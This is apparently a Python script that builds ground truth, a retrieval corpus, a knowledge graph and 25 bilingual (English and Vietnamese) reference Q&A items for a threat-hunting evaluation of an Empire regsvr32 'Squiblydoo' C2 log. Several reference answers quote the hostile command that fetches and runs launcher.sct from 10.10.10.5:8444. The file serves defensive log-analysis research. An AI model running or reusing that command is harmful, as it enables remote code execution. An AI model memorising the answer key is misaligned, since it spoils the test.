"""Build Ground Truth, Retrieval Corpus, Knowledge Graph and 25 Reference Answers for Empire Regsvr32 C2."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Any

from threat_hunting.evidence.regsvr32_c2 import extract_regsvr32_evidence
from threat_hunting.graph import build_knowledge_graph
from threat_hunting.retrieval import build_retrieval_corpus, build_vector_index
from threat_hunting.retrieval.embedding_backend import SentenceTransformerEmbeddingBackend


ROOT = Path(__file__).resolve().parents[1]
CANONICAL_PATH = ROOT / "outputs/canonical/mordor-selected-v2/files/empire_launcher_sct_regsvr32_2020_07_21232741--8b619d07ad79/canonical_events.jsonl"

OUT_GT_DIR = ROOT / "outputs/ground_truth/regsvr32-c2"
OUT_RET_DIR = ROOT / "outputs/retrieval/regsvr32-c2"
OUT_GRAPH_DIR = ROOT / "outputs/graph/regsvr32-c2"

GT_FILE = OUT_GT_DIR / "scenario_ground_truth.json"
CORPUS_FILE = OUT_RET_DIR / "retrieval_corpus.json"
GRAPH_FILE = OUT_GRAPH_DIR / "knowledge_graph.json"
INDEX_FILE = OUT_RET_DIR / "vector_index_e5.json"
ANSWERS_FILE = OUT_GT_DIR / "reference_answers.json"


def digest(path: Path) -> str:
    with path.open("rb") as handle:
        return hashlib.file_digest(handle, "sha256").hexdigest()


def generate_25_reference_answers(gt: dict[str, Any]) -> dict[str, Any]:
    """Generate exactly 25 balanced reference questions for Regsvr32 C2 scenario."""
    # 12 proceed, 7 insufficient_evidence, 6 unrelated
    cases = [
        # 1-12: PROCEED (Relevant Direct & Paraphrase)
        {
            "case_id": "reg-01-command-line",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "Which command line was used to execute regsvr32.exe in the reviewed evidence?",
            "reference_answer": 'regsvr32.exe was executed with "/s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll".',
        },
        {
            "case_id": "reg-02-parent-process",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "Which parent process initiated regsvr32.exe?",
            "reference_answer": "powershell.exe spawned regsvr32.exe.",
        },
        {
            "case_id": "reg-03-c2-ip-port",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "To which remote IP address and port did regsvr32.exe connect?",
            "reference_answer": "regsvr32.exe connected to remote IP 10.10.10.5 on port 8444.",
        },
        {
            "case_id": "reg-04-remote-scriptlet-url",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "What remote scriptlet URL was specified in the regsvr32 command?",
            "reference_answer": "The remote URL was http://10.10.10.5:8444/launcher.sct.",
        },
        {
            "case_id": "reg-05-associated-dll",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "Which DLL was invoked by regsvr32 to execute the scriptlet?",
            "reference_answer": "scrobj.dll (Scriptlet.TypeLib) was invoked.",
        },
        {
            "case_id": "reg-06-mitre-technique-regsvr32",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "Which MITRE ATT&CK technique ID corresponds to the regsvr32 execution?",
            "reference_answer": "T1218.010 corresponds to System Binary Proxy Execution: Regsvr32.",
        },
        {
            "case_id": "reg-07-mitre-technique-web-protocols",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "Which MITRE technique ID corresponds to the HTTP C2 communication?",
            "reference_answer": "T1071.001 corresponds to Application Layer Protocol: Web Protocols.",
        },
        {
            "case_id": "reg-08-c2-framework",
            "category": "relevant_direct",
            "expected_decision": "proceed",
            "query": "Which adversary simulation framework launcher generated this regsvr32 payload?",
            "reference_answer": "The PowerShell Empire post-exploitation framework generated the launcher.sct payload.",
        },
        {
            "case_id": "reg-09-vi-tien-trinh-cha",
            "category": "relevant_paraphrase",
            "expected_decision": "proceed",
            "query": "Tiến trình nào đã sinh ra tiến trình regsvr32.exe trong log?",
            "reference_answer": "Tiến trình powershell.exe đã sinh ra regsvr32.exe.",
        },
        {
            "case_id": "reg-10-vi-dia-chi-c2",
            "category": "relevant_paraphrase",
            "expected_decision": "proceed",
            "query": "Địa chỉ IP máy chủ C2 nào được kết nối đến qua cổng 8444?",
            "reference_answer": "Địa chỉ IP là 10.10.10.5 trên cổng 8444.",
        },
        {
            "case_id": "reg-11-vi-squiblydoo-hoi",
            "category": "relevant_paraphrase",
            "expected_decision": "proceed",
            "query": "Kỹ thuật Squiblydoo lợi dụng binary nào của Windows để tải file .sct từ xa?",
            "reference_answer": "Kỹ thuật Squiblydoo lợi dụng regsvr32.exe phối hợp cùng scrobj.dll.",
        },
        {
            "case_id": "reg-12-vi-mitre-id",
            "category": "relevant_paraphrase",
            "expected_decision": "proceed",
            "query": "Mã kỹ thuật MITRE ATT&CK nào được ánh xạ cho hành vi của regsvr32?",
            "reference_answer": "Mã kỹ thuật là T1218.010 (Regsvr32).",
        },

        # 13-19: INSUFFICIENT EVIDENCE (7 cases - unrecorded telemetry)
        {
            "case_id": "reg-13-sct-plaintext-payload",
            "category": "insufficient_evidence",
            "expected_decision": "abstain",
            "query": "What is the full plaintext VBScript code contained inside launcher.sct?",
            "reference_answer": "Insufficient evidence: Event logs record the URL download request, but do not capture the full plaintext body of the downloaded .sct file.",
        },
        {
            "case_id": "reg-14-stolen-credentials",
            "category": "insufficient_evidence",
            "expected_decision": "abstain",
            "query": "Which user credentials or NTLM hashes were dumped by the Empire agent after callback?",
            "reference_answer": "Insufficient evidence: Process and network telemetry do not record credential dumping or post-exploitation commands.",
        },
        {
            "case_id": "reg-15-c2-beacon-interval",
            "category": "insufficient_evidence",
            "expected_decision": "abstain",
            "query": "What is the exact sleep beacon interval and jitter percentage configured in the C2 agent?",
            "reference_answer": "Insufficient evidence: Sleep configuration parameters are not recorded in Windows event log telemetry.",
        },
        {
            "case_id": "reg-16-lateral-movement-targets",
            "category": "insufficient_evidence",
            "expected_decision": "abstain",
            "query": "Which other internal IP addresses were compromised via lateral movement from this host?",
            "reference_answer": "Insufficient evidence: No subsequent lateral movement events are captured in this scenario log.",
        },
        {
            "case_id": "reg-17-vi-noi-dung-scriptlet",
            "category": "insufficient_evidence",
            "expected_decision": "abstain",
            "query": "Nội dung mã nguồn chi tiết bên trong file launcher.sct là gì?",
            "reference_answer": "Không đủ bằng chứng: Log hệ thống chỉ ghi nhận URL tải file chứ không lưu trữ nội dung file tải về.",
        },
        {
            "case_id": "reg-18-vi-khoi-dong-cung-he-thong",
            "category": "insufficient_evidence",
            "expected_decision": "abstain",
            "query": "Tiến trình regsvr32 có được thiết lập khởi động cùng hệ thống qua Registry Run key không?",
            "reference_answer": "Không đủ bằng chứng: Không có sự kiện ghi nhận thiết lập persistence qua Registry Run key.",
        },
        {
            "case_id": "reg-19-vi-du-lieu-danh-cap",
            "category": "insufficient_evidence",
            "expected_decision": "abstain",
            "query": "Có bao nhiêu gigabyte dữ liệu nhạy cảm đã bị đánh cắp ra ngoài máy chủ C2?",
            "reference_answer": "Không đủ bằng chứng: Không có bằng chứng về khối lượng dữ liệu bị đánh cắp trong log.",
        },

        # 20-25: UNRELATED (6 cases - outside security)
        {
            "case_id": "reg-20-unrelated-astronomy",
            "category": "unrelated",
            "expected_decision": "abstain",
            "query": "How many moons does Jupiter have?",
            "reference_answer": "Unrelated: Astronomy query outside cybersecurity domain.",
        },
        {
            "case_id": "reg-21-unrelated-geography",
            "category": "unrelated",
            "expected_decision": "abstain",
            "query": "What is the capital city of Australia?",
            "reference_answer": "Unrelated: Geography query unrelated to threat hunting.",
        },
        {
            "case_id": "reg-22-unrelated-cinema",
            "category": "unrelated",
            "expected_decision": "abstain",
            "query": "Who directed the movie Interstellar?",
            "reference_answer": "Unrelated: Movie query unrelated to system logs.",
        },
        {
            "case_id": "reg-23-vi-am-thuc",
            "category": "unrelated",
            "expected_decision": "abstain",
            "query": "Công thức làm bánh chưng ngày tết cổ truyền Việt Nam gồm những nguyên liệu gì?",
            "reference_answer": "Không liên quan: Câu hỏi ẩm thực ngoài phạm vi an toàn thông tin.",
        },
        {
            "case_id": "reg-24-vi-lich-su",
            "category": "unrelated",
            "expected_decision": "abstain",
            "query": "Chiến thắng Điện Biên Phủ diễn ra vào năm nào?",
            "reference_answer": "Không liên quan: Câu hỏi lịch sử ngoài phạm vi giám sát mạng.",
        },
        {
            "case_id": "reg-25-vi-y-hoc",
            "category": "unrelated",
            "expected_decision": "abstain",
            "query": "Các triệu chứng phổ biến khi bị cảm cúm mùa là gì?",
            "reference_answer": "Không liên quan: Câu hỏi y tế sức khỏe ngoài phạm vi an ninh hệ thống.",
        },
    ]

    return {
        "schema_version": "reference-answers/v1",
        "scenario_id": "regsvr32-c2",
        "metadata": {
            "total_cases": len(cases),
            "decision_counts": {
                "proceed": sum(1 for c in cases if c["expected_decision"] == "proceed"),
                "abstain": sum(1 for c in cases if c["expected_decision"] == "abstain"),
            },
            "category_counts": {
                "relevant_direct": sum(1 for c in cases if c["category"] == "relevant_direct"),
                "relevant_paraphrase": sum(1 for c in cases if c["category"] == "relevant_paraphrase"),
                "insufficient_evidence": sum(1 for c in cases if c["category"] == "insufficient_evidence"),
                "unrelated": sum(1 for c in cases if c["category"] == "unrelated"),
            },
        },
        "cases": cases,
    }


def main() -> None:
    for d in (OUT_GT_DIR, OUT_RET_DIR, OUT_GRAPH_DIR):
        d.mkdir(parents=True, exist_ok=True)

    print("1. Extracting Regsvr32 Ground Truth from canonical events...")
    gt = extract_regsvr32_evidence(CANONICAL_PATH)
    gt_payload = json.dumps(gt, ensure_ascii=False, indent=2) + "\n"
    GT_FILE.write_text(gt_payload, encoding="utf-8")
    gt_hash = digest(GT_FILE)
    print(f"   Ground Truth saved to {GT_FILE} (SHA256: {gt_hash})")

    print("2. Building Retrieval Corpus...")
    corpus = build_retrieval_corpus(
        gt, source_ground_truth_path="outputs/ground_truth/regsvr32-c2/scenario_ground_truth.json",
        source_ground_truth_sha256=gt_hash
    )
    corpus_payload = json.dumps(corpus, ensure_ascii=False, indent=2) + "\n"
    CORPUS_FILE.write_text(corpus_payload, encoding="utf-8")
    corpus_hash = digest(CORPUS_FILE)
    print(f"   Retrieval Corpus saved to {CORPUS_FILE} ({len(corpus['chunks'])} chunks, SHA256: {corpus_hash})")

    print("3. Building Knowledge Graph...")
    graph = build_knowledge_graph(
        gt, ground_truth_path="outputs/ground_truth/regsvr32-c2/scenario_ground_truth.json",
        ground_truth_sha256=gt_hash
    )
    graph_payload = json.dumps(graph, ensure_ascii=False, indent=2) + "\n"
    GRAPH_FILE.write_text(graph_payload, encoding="utf-8")
    graph_hash = digest(GRAPH_FILE)
    print(f"   Knowledge Graph saved to {GRAPH_FILE} ({len(graph['nodes'])} nodes, {len(graph['edges'])} edges, SHA256: {graph_hash})")

    print("4. Building Vector Index (Multilingual-E5)...")
    embedding_cfg = {
        "provider": "sentence-transformers",
        "model_id": "intfloat/multilingual-e5-small",
        "model_revision": "614241f622f53c4eeff9890bdc4f31cfecc418b3",
        "dimension": 384,
        "distance_metric": "cosine",
        "normalization": "l2",
        "document_prefix": "passage: ",
        "query_prefix": "query: ",
    }
    backend = SentenceTransformerEmbeddingBackend(
        model_id=embedding_cfg["model_id"], model_revision=embedding_cfg["model_revision"],
        dimension=embedding_cfg["dimension"], device="cpu", batch_size=32, show_progress_bar=False
    )
    index = build_vector_index(
        corpus, corpus_path="outputs/retrieval/regsvr32-c2/retrieval_corpus.json",
        corpus_sha256=corpus_hash, embedding=embedding_cfg,
        embed_documents=backend.embed_documents
    )
    index_payload = json.dumps(index, ensure_ascii=False, indent=2) + "\n"
    INDEX_FILE.write_text(index_payload, encoding="utf-8")
    index_hash = digest(INDEX_FILE)
    print(f"   Vector Index saved to {INDEX_FILE} ({len(index['records'])} records, SHA256: {index_hash})")

    print("5. Generating 25 Reference Answers...")
    ref_answers = generate_25_reference_answers(gt)
    ref_payload = json.dumps(ref_answers, ensure_ascii=False, indent=2) + "\n"
    ANSWERS_FILE.write_text(ref_payload, encoding="utf-8")
    answers_hash = digest(ANSWERS_FILE)
    print(f"   Reference Answers saved to {ANSWERS_FILE} (25 cases, SHA256: {answers_hash})")

    print("\nAll Regsvr32 C2 artifacts built successfully!")


if __name__ == "__main__":
    main()
